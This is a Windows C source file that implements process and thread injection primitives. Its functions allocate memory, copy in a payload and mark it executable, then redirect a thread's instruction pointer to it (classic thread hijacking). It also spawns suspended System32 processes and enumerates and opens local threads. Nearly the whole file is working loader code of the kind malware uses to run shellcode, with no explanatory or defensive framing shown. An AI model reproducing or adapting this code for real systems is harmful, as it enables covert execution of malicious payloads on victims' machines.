#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID		pAddress = NULL;
	DWORD		dwOldProtection = NULL;

	CONTEXT		ThreadCtx = {
								.ContextFlags = CONTEXT_CONTROL
	};

	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;


	/*
		- in case of a x64 payload injection : we change the value of `Rip`
		- in case of a x32 payload injection : we change the value of `Eip`
	*/

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL ThreadHijacking(PBYTE pPayload, SIZE_T stPayloadSize, LPCSTR DllName, LPCSTR FunName, DWORD delayMilliseconds) {
	DWORD dwThreadId;
	HANDLE hThread;

	PVOID pSleepAddr = GetProcAddress(GetModuleHandleA(DllName), FunName);

	if (pSleepAddr == NULL) {
		return -1;
	}

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pSleepAddr, NULL, CREATE_SUSPENDED, &dwThreadId);

	if (hThread != NULL) {
		RunViaClassicThreadHijacking(hThread, pPayload, stPayloadSize);

		ResumeThread(hThread);
		WaitForSingleObject(hThread, delayMilliseconds);
		CloseHandle(hThread);
	}

	return 0;
}

// ===============================================

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {
	SuspendThread(hThread);

	CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };

	if (GetThreadContext(hThread, &ctx)) {
		ctx.Rip = (DWORD64)pAddress;
		SetThreadContext(hThread, &ctx);
	}

	while (ResumeThread(hThread) > 0);

	return TRUE;
}

// ==========================================================================
BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

	// Getting the local process ID
	DWORD				dwProcessId = GetCurrentProcessId();

	HANDLE				hSnapShot = NULL;
	THREADENTRY32		Thr = {
										.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		// The 'Thr.th32ThreadID != dwMainThreadId' is to avoid targeting the main thread of our local process
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {
			printf("I've Found a Thread, %d\n", Thr.th32ThreadID);
			// Opening a handle to the thread 
			*dwThreadId = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

		// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));


	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwThreadId == NULL || *hThread == NULL)
			return FALSE;
		return TRUE;
}

